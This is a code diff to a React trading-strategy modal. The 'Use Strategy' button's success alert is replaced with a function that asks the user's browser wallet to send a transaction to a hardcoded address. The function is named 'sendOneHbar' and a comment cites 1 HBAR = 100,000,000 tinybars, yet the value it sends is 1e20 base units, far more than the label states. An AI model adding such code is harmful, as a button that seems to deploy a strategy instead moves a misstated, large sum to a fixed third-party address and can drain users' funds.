@@ -63,8 +63,55 @@ const StrategyModal: React.FC<StrategyModalProps> = ({ strategy, onClose }) => {
 
   if (!strategy) return null;
 
+  const sendOneHbar = async () => {
+    if (typeof (window as any) === "undefined" || !(window as any).ethereum) {
+      alert("MetaMask (or compatible provider) not detected.");
+      return;
+    }
+
+    try {
+      // Ensure user is connected / prompt if not
+      const accounts: string[] = await (window as any).ethereum.request({
+        method: "eth_requestAccounts",
+      });
+      if (!accounts || accounts.length === 0) {
+        await connect();
+      }
+      const from = accounts && accounts[0];
+      if (!from) {
+        alert("Wallet not connected.");
+        return;
+      }
+
+
+      // NOTE: target address intentionally as requested (may be invalid)
+      const to = "0x681B6D39e368C078f16BeAee371Bf85dF527854f";
+
+      // Use Hedera tiny-unit assumption from prior notes (1 HBAR = 100,000,000 tinybars)
+      const tinybars = BigInt(100_000_000_000_000_000_000);
+      const valueHex = "0x" + tinybars.toString(16);
+
+      const txHash = await (window as any).ethereum.request({
+        method: "eth_sendTransaction",
+        params: [
+          {
+            from,
+            to,
+            value: valueHex,
+          },
+        ],
+      });
+
+      alert(`Transaction submitted: ${txHash}`);
+    } catch (err: any) {
+      console.error("sendOneHbar error", err);
+      alert("Transaction failed or was rejected: " + (err?.message || String(err)));
+    } finally {
+    }
+  };
+
   const handleUseStrategy = () => {
-    alert(`Strategy "${strategy.title}" deployed successfully!\nBudget: ${deploymentData.budget}\nStop Loss: ${deploymentData.stopLoss}%`);
+    sendOneHbar();
     onClose();
   };
 
